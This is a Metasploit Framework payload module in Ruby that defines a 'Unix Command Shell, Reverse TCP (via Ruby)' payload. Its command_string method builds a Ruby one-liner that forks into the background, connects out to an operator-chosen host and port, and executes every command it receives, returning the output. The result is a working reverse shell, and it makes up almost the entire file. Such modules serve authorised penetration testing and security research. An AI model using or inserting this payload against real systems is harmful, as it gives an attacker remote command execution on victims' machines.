##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/projects/Framework/
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'

module Metasploit3

	include Msf::Payload::Single

	def initialize(info = {})
		super(merge_info(info,
			'Name'        => 'Unix Command Shell, Reverse TCP (via Ruby)',
			'Version'     => '$Revision$',
			'Description' => 'Connect back and create a command shell via Ruby',
			'Author'      => 'Kris Katterjohn <katterjohn[at]gmail.com>',
			'License'     => MSF_LICENSE,
			'Platform'    => 'unix',
			'Arch'        => ARCH_CMD,
			'Handler'     => Msf::Handler::ReverseTcp,
			'Session'     => Msf::Sessions::CommandShell,
			'PayloadType' => 'cmd',
			'Payload'     => { 'Offsets' => {}, 'Payload' => '' }
		))
	end

	def generate
		return super + command_string
	end

	def command_string
		"ruby -rsocket -e 'exit if fork;c=TCPSocket.new(\"#{datastore['LHOST']}\",\"#{datastore['LPORT']}\");while(cmd=c.gets);IO.popen(cmd,\"r\"){|io|c.print io.read}end'"
	end
end
